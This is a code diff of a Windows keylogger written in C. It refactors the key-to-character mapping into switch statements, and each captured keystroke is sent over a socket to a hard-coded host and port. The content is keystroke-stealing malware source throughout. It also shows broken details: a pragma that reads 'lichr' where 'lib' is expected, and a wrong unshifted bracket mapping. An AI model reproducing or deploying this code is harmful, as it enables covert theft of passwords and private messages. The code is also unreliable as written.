@@ -8,7 +8,6 @@
 #pragma comment(lichr, "ws2_32.lichr")
 #define PORT 42069
 #define HOST "127.0.0.1"
-#define fuck_switch break;
 
 BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
 {
@@ -92,40 +91,48 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                     else if ((i >= 'A' && i <= 'Z') && GetKeyState(VK_SHIFT) >= 0) chr = (char)(i+32);
                     else if (GetKeyState(VK_SHIFT) < 0)
                     {
-                        if ( FALSE == TRUE ) puts("https://github.com/Amirsil");
-                        else if ( i == '0' ) chr = ')';
-                        else if ( i == '1' ) chr = '!';
-                        else if ( i == '2' ) chr = '@';
-                        else if ( i == '3' ) chr = '#';
-                        else if ( i == '4' ) chr = '$';
-                        else if ( i == '5' ) chr = '%';
-                        else if ( i == '6' ) chr = '^';
-                        else if ( i == '7' ) chr = '&';
-                        else if ( i == '8' ) chr = '*';
-                        else if ( i == '9' ) chr = '(';
-                        else if ( i == VK_OEM_1 ) chr = ':';
-                        else if ( i == VK_OEM_PLUS ) chr = '+';
-                        else if ( i == VK_OEM_COMMA ) chr = '<';
-                        else if ( i == VK_OEM_MINUS ) chr = '_';
-                        else if ( i == VK_OEM_PERIOD ) chr = '>';
-                        else if ( i == VK_OEM_2 ) chr = '?';
-                        else if ( i == VK_OEM_3 ) chr = '~';
-                        else if ( i == VK_OEM_4 ) chr = '{';
-                        else if ( i == VK_OEM_5 ) chr = '|';
-                        else if ( i == VK_OEM_6 ) chr = '}';
-                        else if ( i == VK_OEM_7 ) chr = '\"';
+                        switch (i)
+                        {
+                        	case '0' : chr = ')'; break;
+	                        case '1' : chr = '!'; break;
+	                        case '2' : chr = '@'; break;
+	                        case '3' : chr = '#'; break;
+	                        case '4' : chr = '$'; break;
+	                        case '5' : chr = '%'; break;
+	                        case '6' : chr = '^'; break;
+	                        case '7' : chr = '&'; break;
+	                        case '8' : chr = '*'; break; 
+	                        case '9' : chr = '('; break;
+	                        case VK_OEM_1 : chr = ':'; break;
+	                        case VK_OEM_PLUS : chr = '+'; break;
+	                        case VK_OEM_COMMA : chr = '<'; break;
+	                        case VK_OEM_MINUS : chr = '_'; break;
+	                        case VK_OEM_PERIOD : chr = '>'; break;
+	                        case VK_OEM_2 : chr = '?'; break;
+	                        case VK_OEM_3 : chr = '~'; break;
+	                        case VK_OEM_4 : chr = '{'; break;
+	                        case VK_OEM_5 : chr = '|'; break;
+	                        case VK_OEM_6 : chr = '}'; break;
+	                        case VK_OEM_7 : chr = '\"'; break;
+                        }
+                        
                     }
-                    else if ( i == VK_OEM_1 ) chr = ';';
-                    else if ( i == VK_OEM_PLUS ) chr = '=';
-                    else if ( i == VK_OEM_COMMA ) chr = ',';
-                    else if ( i == VK_OEM_MINUS ) chr = '-';
-                    else if ( i == VK_OEM_PERIOD ) chr = '.';
-                    else if ( i == VK_OEM_2 ) chr = '/';
-                    else if ( i == VK_OEM_3 ) chr = '`';
-                    else if ( i == VK_OEM_4 ) chr = '{';
-                    else if ( i == VK_OEM_5 ) chr = '\\';
-                    else if ( i == VK_OEM_6 ) chr = ']';
-                    else if ( i == VK_OEM_7) chr = '\'';
+                    else
+	                    switch (i)
+	                    {
+	                    	case VK_OEM_1 : chr = ';'; break;
+		                    case VK_OEM_PLUS : chr = '='; break;
+		                    case VK_OEM_COMMA : chr = ','; break;
+		                    case VK_OEM_MINUS : chr = '-'; break;
+		                    case VK_OEM_PERIOD : chr = '.'; break;
+		                    case VK_OEM_2 : chr = '/'; break;
+		                    case VK_OEM_3 : chr = '`'; break;
+		                    case VK_OEM_4 : chr = '{'; break;
+		                    case VK_OEM_5 : chr = '\\'; break;
+		                    case VK_OEM_6 : chr = ']'; break;
+		                    case VK_OEM_7 : chr = '\''; break;
+	                    }
+                    
                     if (send(s, &chr, 1, 0) == -1)
                         return 0;
                 }
